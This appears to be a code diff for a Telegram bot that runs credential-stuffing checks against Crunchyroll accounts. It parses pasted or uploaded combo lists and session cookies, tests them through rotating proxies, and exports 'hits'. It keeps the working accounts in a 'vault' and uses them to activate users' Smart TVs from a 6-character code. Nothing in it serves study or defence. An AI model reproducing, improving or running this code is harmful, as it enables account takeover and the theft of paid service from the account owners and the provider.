+                "expiry": data.get("expiry") or "N/A",
+                "streams": data.get("streams") or "N/A",
+            }
+        low_err = str(err).lower()
+        if any(k in low_err for k in ("invalid_code", "expired", "not_found", "user_code")):
+            return {"success": False, "error": "invalid_code", "detail": err}
+        if "401" in low_err or "403" in low_err or "unauthorized" in low_err:
+            remove_from_vault(cred)
+            continue
+
+    return {"success": False, "error": "all_failed"}
+
+
+async def _handle_tv_code(msg, uid: int, username: str, raw_code: str):
+    code = re.sub(r"[^A-Za-z0-9]", "", raw_code or "").upper().strip()
+    if len(code) != 6:
+        await reply_menu(
+            msg,
+            "❌ <b>Invalid TV Code!</b>\n\nCrunchyroll TV code must be <b>6 alphanumeric characters</b>.\nExample: <code>/tv ABCD12</code>",
+            [[("📺 Try Again", "tv_prompt", "success"), ("⬅️ Menu", "menu", "danger")]],
         )
-    return head + f"⚠️ Extracted, but check result: <code>{esc(st)}</code> {esc(info)}\n🔥 <b>CRUNCHYROLL</b> 🎀"
+        return
 
-# ===================== HIT CARDS (flood-safe) =====================
+    if vault_count() == 0:
+        await reply_menu(
+            msg,
+            "😔 <b>Vault is Empty!</b>\n\nNo accounts available right now. Wait for admin to upload accounts.",
+            [[("⬅️ Menu", "menu", "danger")]],
+        )
+        return
+
+    allowed, rem = tv_quota_check(uid, username)
+    if not allowed:
+        await reply_menu(
+            msg,
+            f"⚠️ <b>Daily TV Limit Reached!</b>\n\nYou have used all <code>{DAILY_TV_LIMIT}</code> TV activations for today.",
+            [[("⬅️ Menu", "menu", "danger")]],
+        )
+        return
+
+    status_msg = await msg.reply_text(
+        f"📺 <b>Activating Smart TV...</b>\n━━━━━━━━━━━━━━━━━━━━━\n📟 Code: <code>{code}</code>\n🔍 Selecting working account from vault...",
+        parse_mode=ParseMode.HTML,
+    )
+
+    res = await asyncio.to_thread(_process_tv_activation, code)
+
+    if res.get("success"):
+        tv_quota_inc(uid, username)
+        _, rem_after = tv_quota_check(uid, username)
+        flag = flag_emoji(res.get("cc"))
+        rem_line = f"\n💫 Remaining today: <code>{rem_after}</code>" if not is_admin(uid, username) else ""
+        await status_msg.edit_text(
+            f"✅ <b>SMART TV ACTIVATED!</b> 🎉\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📟 Code: <code>{code}</code>\n"
+            f"📦 Plan: <code>{esc(res.get('plan'))}</code>\n"
+            f"🌍 Country: {flag + ' ' if flag else ''}<code>{esc(res.get('country'))}</code>\n"
+            f"📅 Expiry: <code>{esc(res.get('expiry'))}</code>\n"
+            f"📺 Streams: <code>{esc(str(res.get('streams')))}</code>"
+            f"{rem_line}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🍿 <i>Your TV is now ready to watch Crunchyroll!</i>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=_build_kb([[("📺 Pair Another TV", "tv_prompt", "success"), ("🏠 Menu", "menu", "danger")]]),
+        )
+    elif res.get("error") == "invalid_code":
+        await status_msg.edit_text(
+            f"❌ <b>Invalid or Expired TV Code</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📟 Code: <code>{code}</code>\n"
+            f"⚠️ Please check your TV screen and try again with a fresh 6-character code.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=_build_kb([[("📺 Try Again", "tv_prompt", "success"), ("🏠 Menu", "menu", "danger")]]),
+        )
+    else:
+        await status_msg.edit_text(
+            f"❌ <b>TV Activation Failed</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📟 Code: <code>{code}</code>\n"
+            f"⚠️ Working accounts exhausted or blocked. Please try again shortly.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=_build_kb([[("📺 Try Again", "tv_prompt", "success"), ("🏠 Menu", "menu", "danger")]]),
+        )
+
+
+# ===================== HIT CARDS & CHECK RUNNER =====================
 async def send_hit_cards(msg, entries: List[dict], cap: int = MAX_HIT_CARDS) -> int:
     sent = 0
     for e in entries[:cap]:
@@ -2128,39 +1907,36 @@ async def send_hit_cards(msg, entries: List[dict], cap: int = MAX_HIT_CARDS) -> 
             try:
                 await msg.reply_text(card, parse_mode=ParseMode.HTML)
                 sent += 1
-                await asyncio.sleep(0.4)
+                await asyncio.sleep(0.35)
                 break
-            except RetryAfter as fw:  # flood control
-                ra = fw.retry_after
-                ra = ra.total_seconds() if hasattr(ra, "total_seconds") else float(ra)
+            except RetryAfter as fw:
+                ra = fw.retry_after.total_seconds() if hasattr(fw.retry_after, "total_seconds") else float(fw.retry_after)
                 await asyncio.sleep(ra + 0.3)
             except Exception:
                 return sent
     return sent
 
-# ===================== CHECK RUNNER — BlazeNXT PREMIUM =====================
-async def _run_and_report(msg, uid: int, text: str):
-    # Secure: 5 sec cooldown + 1 check at a time
+
+async def _run_and_report(msg, uid: int, text: str, save_hits_to_vault: bool = True):
     with USER_LOCK:
         now = time.time()
-        last = USER_LAST_CHECK.get(uid, 0)
-        if now - last < 5:
-            await reply_menu(msg, "⏳ <b>Slow down</b> — wait 5 sec between checks.", [[("⬅️ Back", "menu", "danger")]])
+        if now - USER_LAST_CHECK.get(uid, 0) < 4:
+            await reply_menu(msg, "⏳ <b>Slow down</b> — wait a few seconds.", [[("⬅️ Back", "menu", "danger")]])
             return
         if USER_LAST_CHECK.get(f"busy_{uid}"):
-            await reply_menu(msg, "⏳ <b>Busy</b> — one check at a time.", [[("⬅️ Back", "menu", "danger")]])
+            await reply_menu(msg, "⏳ <b>Busy</b> — one scan at a time.", [[("⬅️ Back", "menu", "danger")]])
             return
         USER_LAST_CHECK[f"busy_{uid}"] = True
         USER_LAST_CHECK[uid] = now
+
     line_count = max(1, text.count("\n") + 1)
     creds_preview = len(extract_credentials(text))
-    # Premium initial card — mimics BlazeNXT "CRUNCHYROLL Scan — Live 0.6%"
     init_card = (
         f"╭────────────────────────╮\n"
         f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
         f"╰────────────────────────╯\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📄 Lines: <code>{line_count}</code> • 🎯 Combos: <code>{creds_preview}</code>\n"
+        f"📄 Lines: <code>{line_count}</code> • 🎯 Items: <code>{creds_preview}</code>\n"
         f"⏳ Crunchyroll 0% [░░░░░░░░░░░░░░░░░░░░] (0/{creds_preview})\n"
         f"⭐ Hits: <code>0</code> | 🆓 Free: <code>0</code> | 🔐 2FA: <code>0</code> | ❌ Bad: <code>0</code> | ⚠️ Errors: <code>0</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n"
@@ -2170,206 +1946,241 @@ async def _run_and_report(msg, uid: int, text: str):
     note = await msg.reply_text(init_card, parse_mode=ParseMode.HTML)
     loop = asyncio.get_running_loop()
     reporter = ProgressReporter(note, loop)
-    # Immediate hit sender
-    sent_hits = []
+
     def _hit_cb(entry):
         try:
-            sent_hits.append(entry)
-            # Send hit card immediately without waiting
-            fut = asyncio.run_coroutine_threadsafe(send_hit_cards(msg, [entry], cap=1), loop)
-            # Don't wait, just fire
+            if save_hits_to_vault:
+                add_to_vault([entry])
+            asyncio.run_coroutine_threadsafe(send_hit_cards(msg, [entry], cap=1), loop)
         except Exception:
             pass
 
-    # Dual proxy: auto-fetch + manual pool both active
-    try:
-        ensure_proxies()
-    except Exception:
-        pass
-    async def _proxy_watchdog():
-        # 24x7 smart watchdog — keeps proxies alive + unstuck progress
-        last_processed = 0
-        stuck_since = time.time()
-        while True:
-            await asyncio.sleep(45)
-            try:
-                cnt = proxy_count()
-                if cnt < 15:
-                    await asyncio.to_thread(refresh_live_proxies, True)
-                if pool_size() > 0 and cnt < 10:
-                    _load_pool_into_live()
-                if cnt == 0:
-                    await asyncio.to_thread(refresh_live_proxies, True)
-                # Stuck detection: if processed hasn't moved for 90s, force refresh
-                try:
-                    cur = results.get("processed", 0) if 'results' in locals() else 0
-                    if cur == last_processed:
-                        if time.time() - stuck_since > 90:
-                            logger.warning("Watchdog: stuck at %d for 90s — refreshing proxies", cur)
-                            await asyncio.to_thread(refresh_live_proxies, True)
-                            stuck_since = time.time()
-                    else:
-                        last_processed = cur
-                        stuck_since = time.time()
-                except Exception:
-                    pass
-            except Exception as e:
-                logger.debug("watchdog err %s", e)
-            try:
-                if note.text and "SCAN COMPLETE" in note.text:
-                    break
-            except Exception:
-                break
-        return
-    wd_task = asyncio.create_task(_proxy_watchdog())
     try:
         results = await asyncio.to_thread(run_check, text, reporter, _hit_cb)
     except Exception as e:
         with USER_LOCK:
             USER_LAST_CHECK.pop(f"busy_{uid}", None)
-        await note.edit_text(f"❌ <b>Check error</b>\n━━━━━━━━━━━━━━━━━━━━━\n<code>{esc(str(e)[:120])}</code>",
-                             parse_mode=ParseMode.HTML)
+        await note.edit_text(
+            f"❌ <b>Check error</b>\n━━━━━━━━━━━━━━━━━━━━━\n<code>{esc(str(e)[:120])}</code>",
+            parse_mode=ParseMode.HTML,
+        )
         return
-    try:
-        wd_task.cancel()
-    except Exception:
-        pass
+
+    if save_hits_to_vault and results["hits"]:
+        add_to_vault(results["hits"])
+
     bump_checks(results["processed"])
     await note.edit_text(summary_text(results), parse_mode=ParseMode.HTML)
 
-    # exports (sent before the cards so the conversation stays readable)
-    premium_only = STORE.get_premium_only(uid)
+    premium_only = STORE.get_premium_only(uid) if STORE else True
     to_send = results["hits"] if premium_only else results["hits"] + results["free"]
     if to_send:
         txt_path = make_export(to_send, "txt")
         json_path = make_export(to_send, "json")
         try:
             with open(txt_path, "rb") as f:
-                await msg.reply_document(document=InputFile(f, filename="accounts.txt"),
-                                         caption=f"💎 Accounts: {len(to_send)}")
+                await msg.reply_document(document=InputFile(f, filename="accounts.txt"), caption=f"💎 Accounts: {len(to_send)}")
             with open(json_path, "rb") as f:
-                await msg.reply_document(document=InputFile(f, filename="accounts.json"),
-                                         caption="📁 JSON export")
+                await msg.reply_document(document=InputFile(f, filename="accounts.json"), caption="📁 JSON export")
         finally:
             Path(txt_path).unlink(missing_ok=True)
             Path(json_path).unlink(missing_ok=True)
 
-    # ⭐ one detail card per hit (flood-safe, capped)
-    if results["hits"]:
-        sent = await send_hit_cards(msg, results["hits"])
-        extra = len(results["hits"]) - sent
-        tail = f"\n<i>…+{extra} more in the export file</i>" if extra > 0 else ""
-        rows = [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
-                [("⬅️ Main Menu", "menu", "danger")]]
-        with USER_LOCK:
-            USER_LAST_CHECK.pop(f"busy_{uid}", None)
-        await reply_menu(msg, f"📬 <b>Hit cards sent:</b> {sent} {tail}", rows)
-    else:
-        with USER_LOCK:
-            USER_LAST_CHECK.pop(f"busy_{uid}", None)
-        await reply_menu(msg, "😕 No hits this time.",
-                         [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
-                          [("⬅️ Main Menu", "menu", "danger")]])
+    with USER_LOCK:
+        USER_LAST_CHECK.pop(f"busy_{uid}", None)
 
-# ===================== HANDLERS (100% button flow) =====================
+    await reply_menu(
+        msg,
+        f"✅ <b>Done!</b> Hits: <code>{len(results['hits'])}</code> • Vault Total: <code>{vault_count()}</code>",
+        [[("🗄️ View Vault", "vault_view", "primary"), ("📺 TV Login", "tv_prompt", "success")],
+         [("⬅️ Main Menu", "menu", "danger")]],
+    )
+
+
+# ===================== FILE & ZIP EXTRACTION HELPER =====================
+def _extract_text_from_bytes(filename: str, raw_bytes: bytes) -> str:
+    fname = (filename or "").lower()
+    if fname.endswith(".zip"):
+        chunks = []
+        try:
+            with zipfile.ZipFile(io.BytesIO(raw_bytes), "r") as zf:
+                for zinfo in zf.infolist():
+                    zname = zinfo.filename
+                    if zname.endswith("/") or zname.startswith("__MACOSX") or os.path.basename(zname).startswith("."):
+                        continue
+                    if not zname.lower().endswith((".txt", ".csv", ".log", ".json", ".dat", ".lst")):
+                        continue
+                    try:
+                        chunks.append(zf.read(zname).decode("utf-8", errors="ignore"))
+                    except Exception:
+                        continue
+        except Exception as e:
+            logger.warning("ZIP extract failed: %s", e)
+        return "\n".join(chunks)
+    return raw_bytes.decode("utf-8", errors="ignore")
+
+
+# ===================== COMMAND & MESSAGE HANDLERS =====================
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     msg = update.effective_message
     if not user or not msg:
         return
     uid = user.id
-    name = getattr(user, "first_name", None) or getattr(user, "username", None) or str(uid)
-    if not is_admin(uid, getattr(user, "username", None)):
-        owner_contact = f"<a href=\"https://t.me/{OWNER_USERNAME.lstrip('@')}\">{OWNER_USERNAME}</a> (<code>{OWNER_ID}</code>)" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"<code>{OWNER_ID}</code>"
-        owner_url = f"https://t.me/{OWNER_USERNAME.lstrip('@')}" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"tg://user?id={OWNER_ID}"
-        await reply_menu(msg, f"❌ <b>Access Denied</b>\n\nThis bot is <b>Owner + Admins only</b>.\nContact owner: {owner_contact}", [[("💬 Contact Owner", owner_url, "primary")]])
-        return
-    # Single path — no double message, board completely removed
-    try:
-        text = welcome_premium_text(uid, name)
-        is_owner = is_admin(uid, getattr(user, "username", None))
-        if is_owner:
-            text = "👑 <b>Welcome Owner!</b>\n" + "━━━━━━━━━━━━━━━━━━━━━\n" + text
-    except Exception as e:
-        logger.warning("welcome failed %s", e)
-        text, _ = menu_main(uid)
-        if is_admin(uid, getattr(user, "username", None)):
-            text = "👑 <b>Welcome Owner!</b>\n\n" + text
-    _, rows = menu_main(uid)
-    # Inline only — no reply board, ensure buttons show (single message)
-    try:
-        await reply_menu(msg, text, rows)
-    except Exception as e:
-        logger.warning("cmd_start inline send failed %s", e)
-        try:
-            await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=_build_kb(rows))
-        except Exception:
-            pass
-    # Also try to remove old reply board if still cached (separate message, delete after)
+    uname = getattr(user, "username", None)
+    name = getattr(user, "first_name", None) or uname or str(uid)
+    text = welcome_premium_text(uid, name, uname)
+    _, rows = menu_main(uid, uname)
+    await reply_menu(msg, text, rows)
     try:
         rm = await msg.reply_text(" ", reply_markup=ReplyKeyboardRemove())
-        try:
-            await rm.delete()
-        except Exception:
-            pass
+        await rm.delete()
     except Exception:
         pass
-    return
+
+
+async def cmd_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    msg = update.effective_message
+    if not user or not msg:
+        return
+    args = context.args or []
+    if not args:
+        set_pending(user.id, "tv_code")
+        await reply_menu(
+            msg,
+            "📺 <b>CRUNCHYROLL TV LOGIN</b>\n━━━━━━━━━━━━━━━━━━━━━\nSend your <b>6-character TV code</b> (e.g. <code>ABCD12</code>):",
+            [[("⬅️ Cancel", "menu", "danger")]],
+        )
+        return
+    await _handle_tv_code(msg, user.id, getattr(user, "username", None), args[0])
+
+
+async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    msg = update.effective_message
+    if not user or not msg:
+        return
+    if not is_admin(user.id, getattr(user, "username", None)):
+        await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
+        return
+
+    doc = msg.document or (msg.reply_to_message.document if msg.reply_to_message else None)
+    if not doc:
+        set_pending(user.id, "file")
+        await reply_menu(
+            msg,
+            "📎 <b>Usage:</b> Reply to a <code>.zip</code>, <code>.txt</code>, <code>.json</code>, or <code>.csv</code> file with <code>/upload</code> (or send the file directly).",
+            [[("⬅️ Cancel", "menu", "danger")]],
+        )
+        return
+
+    await _process_document(msg, context, user.id, doc)
+
+
+async def cmd_vault(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    msg = update.effective_message
+    if not user or not msg:
+        return
+    if not is_admin(user.id, getattr(user, "username", None)):
+        await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
+        return
+    await _send_vault_summary(msg, edit=False)
+
+
+async def cmd_clearvault(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    msg = update.effective_message
+    if not user or not msg:
+        return
+    if not is_admin(user.id, getattr(user, "username", None)):
+        await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
+        return
+    save_vault([])
+    await reply_menu(msg, "🧹 <b>Vault Cleared!</b>\n🗄️ Accounts in vault: <code>0</code>", [[("⬅️ Menu", "menu", "danger")]])
+
+
+async def _send_vault_summary(msg, edit: bool = False):
+    items = load_vault()
+    if not items:
+        txt = "🗄️ <b>Crunchyroll Vault is Empty</b>\n\nUse <code>/upload</code> on a <code>.zip/.txt/.json</code> file to add accounts."
+        kb = [[("📂 Upload File", "file", "success"), ("⬅️ Menu", "menu", "danger")]]
+        await (edit_menu(msg, txt, kb) if edit else reply_menu(msg, txt, kb))
+        return
+
+    lines = [
+        "🗄️ <b>CRUNCHYROLL VAULT</b>",
+        "━━━━━━━━━━━━━━━━━━━━━",
+        f"📦 Total Working Accounts: <code>{len(items)}</code>",
+        "━━━━━━━━━━━━━━━━━━━━━",
+    ]
+    for idx, item in enumerate(reversed(items[-8:]), 1):
+        cred = item.get("cred") or {}
+        d = item.get("data") or {}
+        label = cred.get("value", "?") if cred.get("type") == "email" else f"{cred.get('type', 'token')}:{cred.get('value', '')[:16]}..."
+        plan = d.get("plan") or "Premium"
+        cc = d.get("cc") or ""
+        flag = flag_emoji(cc)
+        exp = d.get("expiry") or "N/A"
+        lines.append(f"<b>{idx}.</b> <code>{esc(label)}</code>\n    └ {flag} {esc(plan)} • Exp: <code>{esc(exp)}</code>")
+
+    kb = [
+        [("📤 Export Vault", "vault_export", "primary"), ("🧹 Clear Vault", "vault_clear", "danger")],
+        [("📺 TV Login", "tv_prompt", "success"), ("⬅️ Menu", "menu", "danger")],
+    ]
+    txt = "\n".join(lines)
+    await (edit_menu(msg, txt, kb) if edit else reply_menu(msg, txt, kb))
+
 
 async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Catch-all for any typed /command -> steer the user to the buttons."""
     user = update.effective_user
     msg = update.effective_message
     if not user or not msg:
         return
     txt = (msg.text or "").strip().lower()
+    uname = getattr(user, "username", None)
+
     if txt in ("/cmds", "/commands", "/help"):
         await reply_menu(msg, help_text(), [[("⬅️ Back", "menu", "danger")]])
         return
     if txt in ("/proxy", "/proxies", "/proxyinfo", "/pool"):
-        if not is_admin(user.id, getattr(user, "username", None)):
-            await reply_menu(msg, "❌ <b>Admin Only</b>\nOnly owner/admins can use this bot.", [[("⬅️ Back", "menu", "danger")]])
+        if not is_admin(user.id, uname):
+            await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
         ptext, rows = menu_owner()
         await reply_menu(msg, ptext, rows)
         return
     if txt in ("/addproxy", "/addproxies", "/uploadproxy"):
-        if not is_admin(user.id, getattr(user, "username", None)):
+        if not is_admin(user.id, uname):
             await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
         set_pending(user.id, "addpx")
-        await reply_menu(msg, "📥 <b>Upload Proxies</b>\n\nPaste <code>user:pass@ip:port</code> or <code>ip:port</code> lines, or send a <code>.txt</code> file.\nAuto-detect + auto-check.", [[("⬅️ Back", "proxysettings", "danger")]])
+        await reply_menu(msg, "📥 <b>Upload Proxies</b>\n\nPaste <code>user:pass@ip:port</code> or <code>ip:port</code> lines.", [[("⬅️ Back", "proxysettings", "danger")]])
         return
     if txt in ("/clearproxy", "/clearproxies"):
-        if not is_admin(user.id, getattr(user, "username", None)):
+        if not is_admin(user.id, uname):
             await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
         await asyncio.to_thread(clear_pool)
-        await reply_menu(msg, "🧹 <b>Proxies Cleared</b>\nPool & live reset.", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
+        await reply_menu(msg, "🧹 <b>Proxies Cleared</b>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
         return
     if txt.startswith("/addadmin"):
         if user.id != OWNER_ID and user.id not in ADMIN_IDS:
-            await reply_menu(msg, "❌ <b>Owner Only</b> — only owner can add admins.", [[("⬅️ Back", "menu", "danger")]])
+            await reply_menu(msg, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
             return
         parts = txt.split()
         if len(parts) < 2 and msg.reply_to_message and msg.reply_to_message.from_user:
             target = msg.reply_to_message.from_user
             ok = STORE.add_admin(target.id, getattr(target, "username", None))
-            await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{target.id}</code> @{getattr(target,'username','')}", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
+            await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{target.id}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
             return
         if len(parts) < 2:
-            await reply_menu(msg, "👑 <b>Add Admin</b>\n\nUse: <code>/addadmin 123456789</code> or <code>/addadmin @username</code>\nOr reply to a user with /addadmin", [[("⬅️ Back", "menu", "danger")]])
+            await reply_menu(msg, "Use: <code>/addadmin 123456789</code> or <code>/addadmin @username</code>", [[("⬅️ Back", "menu", "danger")]])
             return
         arg = parts[1].lstrip("@")
-        try:
-            if arg.isdigit():
-                ok = STORE.add_admin(int(arg))
-                await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{arg}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
-            else:
-                ok = STORE.add_admin(0, arg)
-                await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: @{arg}", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
-        except Exception as e:
-            await reply_menu(msg, f"❌ Error: <code>{e}</code>", [[("⬅️ Back", "menu", "danger")]])
+        ok = STORE.add_admin(int(arg)) if arg.isdigit() else STORE.add_admin(0, arg)
+        await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{esc(arg)}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
         return
     if txt.startswith("/removeadmin") or txt.startswith("/deladmin"):
         if user.id != OWNER_ID and user.id not in ADMIN_IDS:
@@ -2377,103 +2188,59 @@ async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         parts = txt.split()
         if len(parts) < 2:
-            await reply_menu(msg, "👑 <b>Remove Admin</b>\nUse: <code>/removeadmin 123456</code> or <code>/removeadmin @username</code>", [[("⬅️ Back", "menu", "danger")]])
+            await reply_menu(msg, "Use: <code>/removeadmin 123456</code> or <code>/removeadmin @username</code>", [[("⬅️ Back", "menu", "danger")]])
             return
         arg = parts[1].lstrip("@")
-        try:
-            if arg.isdigit():
-                ok = STORE.remove_admin(int(arg))
-            else:
-                ok = STORE.remove_admin(None, arg)
-            await reply_menu(msg, f"{'✅ Removed' if ok else '❌ Not found'}: <code>{arg}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
-        except Exception as e:
-            await reply_menu(msg, f"❌ Error: <code>{e}</code>", [[("⬅️ Back", "menu", "danger")]])
+        ok = STORE.remove_admin(int(arg)) if arg.isdigit() else STORE.remove_admin(None, arg)
+        await reply_menu(msg, f"{'✅ Removed' if ok else '❌ Not found'}: <code>{esc(arg)}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
         return
     if txt in ("/admins", "/adminlist"):
         admins = STORE.get_admins() if STORE else []
         admins_u = STORE.get_setting("admin_usernames", []) if STORE else []
-        txt2 = "👥 <b>Admins</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
-        txt2 += f"👑 Owner: <code>{OWNER_ID}</code> @{OWNER_USERNAME.lstrip('@')}\n"
+        txt2 = f"👥 <b>Admins</b>\n━━━━━━━━━━━━━━━━━━━━━\n👑 Owner: <code>{OWNER_ID}</code> @{OWNER_USERNAME.lstrip('@')}\n"
         for a in admins:
             txt2 += f"• <code>{a}</code>\n"
         for u in admins_u:
             txt2 += f"• @{u}\n"
-        if not admins and not admins_u:
-            txt2 += "<i>No extra admins</i>\n"
-        txt2 += "\n<i>Owner can /addadmin or /removeadmin</i>"
         await reply_menu(msg, txt2, [[("⬅️ Back", "menu", "danger")]])
         return
-    if txt in ("/threads", "/setthreads"):
-        await reply_menu(msg, f"🧵 <b>Set Threads</b>\nCurrent: <code>{THREADS}</code> • Max 300", [[("🧵 50", "threads_50", "primary"), ("🧵 100", "threads_100", "success")], [("🧵 200", "threads_200", "primary"), ("🧵 300", "threads_300", "success")], [("⬅️ Back", "proxysettings", "danger")]])
-        return
-    text, rows = menu_main(user.id)
-    await reply_menu(msg, "🔘 This bot is 100% button-driven — pick an option below 👇\n\n" + text, rows)
+
+    text, rows = menu_main(user.id, uname)
+    await reply_menu(msg, text, rows)
+
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global THREADS
     user = update.effective_user
     msg = update.effective_message
     if not user or not msg or not msg.text:
         return
     uid = user.id
+    uname = getattr(user, "username", None)
     text = msg.text.strip()
-    if not is_admin(uid, getattr(user, "username", None)):
-        owner_contact2 = f"<a href=\"https://t.me/{OWNER_USERNAME.lstrip('@')}\">{OWNER_USERNAME}</a> (<code>{OWNER_ID}</code>)" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"<code>{OWNER_ID}</code>"
-        owner_url2 = f"https://t.me/{OWNER_USERNAME.lstrip('@')}" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"tg://user?id={OWNER_ID}"
-        await reply_menu(msg, f"❌ <b>Access Denied</b>\nOwner/Admins only.\nContact: {owner_contact2}", [[("💬 Contact Owner", owner_url2, "primary")]])
-        return
-    # Compat: if user still has old reply board cached, map its text to inline actions (single message)
-    _compat_map = {
-        "💎 Check Account": "check", "📂 Check File": "file",
-        "📖 How To Use": "help", "📊 Bot Stats": "status",
-        "⚙️ Proxy Settings": "proxysettings", "👑 Tools Panel": "proxysettings",
-        "👑 Owner Panel": "proxysettings", "⬅️ Main Menu": "menu", "⬅️ Back": "proxysettings",
-        "🔁 Check Again": "check",
-    }
-    compat_action = _compat_map.get(text)
-    if compat_action:
-        clear_pending(uid)
-        if compat_action == "menu":
-            t2, rows2 = menu_main(uid)
-            await reply_menu(msg, t2, rows2)
-            return
-        elif compat_action == "check":
-            set_pending(uid, "creds")
-            await reply_menu(msg, "💎 <b>Check Account</b>\n\nSend <code>EMAIL:PASS</code> — one or many lines.\nExample: <code>user@gmail.com:pass123</code>", [[("⬅️ Back", "menu", "danger")]])
-            return
-        elif compat_action == "file":
-            await reply_menu(msg, "📂 <b>Check File</b>\n\nSend me your <code>.txt</code> / <code>.csv</code> file with combos.", [[("⬅️ Back", "menu", "danger")]])
-            return
-        elif compat_action == "help":
-            await reply_menu(msg, help_text(), [[("⬅️ Back", "menu", "danger")]])
-            return
-        elif compat_action == "status":
-            await reply_menu(msg, status_text(), [[("⬅️ Back", "menu", "danger")]])
-            return
-        elif compat_action == "proxysettings":
-            ptext, rows = menu_owner()
-            await reply_menu(msg, ptext, rows)
-            return
     pending = get_pending(uid)
 
-    # ---------- active input flows ----------
     if pending:
         kind = pending["kind"]
+        if kind == "tv_code":
+            clear_pending(uid)
+            await _handle_tv_code(msg, uid, uname, text)
+            return
+
+        if not is_admin(uid, uname):
+            clear_pending(uid)
+            await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
+            return
 
         if kind == "creds":
             clear_pending(uid)
             creds = extract_credentials(text)
             if not creds:
-                await reply_menu(msg,
-                    "❌ No credentials found.\nFormat: <code>EMAIL:PASS</code>",
-                    [[("🔁 Try Again", "check", "success"), ("⬅️ Menu", "menu", "danger")]])
+                await reply_menu(msg, "❌ No credentials/cookies found.\nFormat: <code>EMAIL:PASS</code> or <code>etp_rt</code>", [[("🔁 Try Again", "check", "success"), ("⬅️ Menu", "menu", "danger")]])
                 return
             if len(creds) > MAX_PASTED_CREDS:
-                await reply_menu(msg,
-                    f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file instead.",
-                    [[("📂 Check File", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
+                await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file instead.", [[("📂 Check File", "file", "primary")]])
                 return
-            await _run_and_report(msg, uid, text)
+            await _run_and_report(msg, uid, text, save_hits_to_vault=True)
             return
 
         if kind == "addpx":
@@ -2481,20 +2248,12 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             lines = [l for l in text.splitlines() if l.strip()]
             if not lines:
                 return
-            if len(lines) > MAX_PASTED_PROXIES:
-                await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_PROXIES}).",
-                                 [[("📥 Try Again", "addpx", "primary"),
-                                   ("⬅️ Back", "proxysettings", "danger")]])
-                return
-            ac = bool(STORE.get_setting("auto_check", True))
+            ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
             added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
-            # Wait a bit for background test to start, then show live
-            await asyncio.sleep(1)
-            status = f"🔎 Auto-checking {added} new... Live: <code>{proxy_count()}</code> • Pool: <code>{pool_size()}</code>" if ac else f"Added. Pool: <code>{pool_size()}</code>"
             await reply_menu(
                 msg,
